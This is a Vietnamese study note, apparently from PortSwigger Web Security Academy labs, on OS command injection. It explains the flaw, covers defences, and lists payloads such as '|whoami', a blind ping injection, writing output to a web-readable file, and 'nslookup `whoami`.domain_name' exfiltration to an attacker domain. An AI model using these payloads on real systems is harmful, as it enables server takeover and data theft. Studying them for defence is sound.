---
title: "OS Command Injection"
date: 2026-08-28
platform: "PortSwigger Web Security Academy"
tags:
  - command-injection
  - oast
  - web-security
---

## Bản chất và khái niệm chung

- Là một lỗ hổng cho phép kẻ tấn công khiến server thực thi các lệnh hệ điều hành do mình kiểm soát. OS command injection thường có thể dẫn đến việc attacker kiểm soát hoàn toàn ứng dụng và dữ liệu mà process đó có quyền truy cập.

- Bản chất của lỗ hổng này vẫn là không chặt chẽ trong việc xử lý giá trị input do người dùng truyền vào, từ đó dẫn tới server thực thi những lệnh hệ thống không mong muốn.

## Cách khai thác phổ biến

- Truyền vào payload với syntax ví dụ: “|whoami”, dấu “|” trong linux có ý nghĩa là 1 pipe, command đằng trước sẽ là input đầu vào cho command đằng sau, ở đây là câu lệnh “whoami”, nếu như sử dụng “&amp;” thì nó sẽ tách riêng câu command đằng sau thành 1 phần riêng của HTTP request, và nó không hiểu “whoami” có ý nghĩa gì. Từ đó không trả về được kết quả injection mong muốn.

- Khai thác Blind OS Command Injection bằng cách sử dụng câu lệnh “ping”, vì kết quả output vẫn được thực hiện nhưng không được hiển thị nên việc sử dụng câu lệnh “ping” để chứng minh ở đó có lỗ hổng. Ví dụ “email=x||ping+-c+10+127.0.0.1||”, kí hiệu “||” có ý nghĩa nếu như vế đằng trước hoặc sau không thực hiện thành công thì sẽ chạy vế còn lại.

- Một cách khai thác khác cho dạng này thay vì dựa trên thời gian delay, đó là ghi vào 1 file mà web server có thể truy cập, ví dụ như “/var/www/static/ok.txt&amp;”, sau đó tìm query string có thể nhận được file này vào để xem kết quả của command đã truy vấn.

- Cách tiếp theo là sử dụng “nslookup domain”, bản chất là để cho server gửi request DNS đến domain mà attacker host, nếu có request gửi đến chứng tỏ là command đã được thực hiện.

- Ngoài ra để cải tiến kĩ thuật out-of-bound này thì ta có thể kết hợp để gửi các command OS như “whoami”,… trong cùng câu lệnh “nslookup” khi này kiểm tra request DNS thì có thể thấy nội dung server gửi đi. Ví dụ “nslookup `whoami`.domain_name”. Phải có dấu “.” ở đây vì nếu như không có dấu chấm, câu truy vấn này sẽ tìm domain có tên là “whoami”, attacker không host server đó, còn có dấu chấm thì server có thể hiểu đó là subdomain của server mà attacker host để gửi request tới.

## Cách phòng chống

- Không gọi OS command từ application → dùng API an toàn của ngôn ngữ/framework.

- Whitelist: chỉ cho phép các giá trị được quy định trước.

- Validate kiểu dữ liệu: nếu cần số → chỉ chấp nhận số.

- Chỉ cho phép alphanumeric: A-Z, a-z, 0-9; loại bỏ ký tự đặc biệt và khoảng trắng.

- Không nên chỉ escape shell metacharacters như &amp;, |, ;, &gt;, $...

- Validate input chặt chẽ &gt; cố gắng sanitize/escape input.
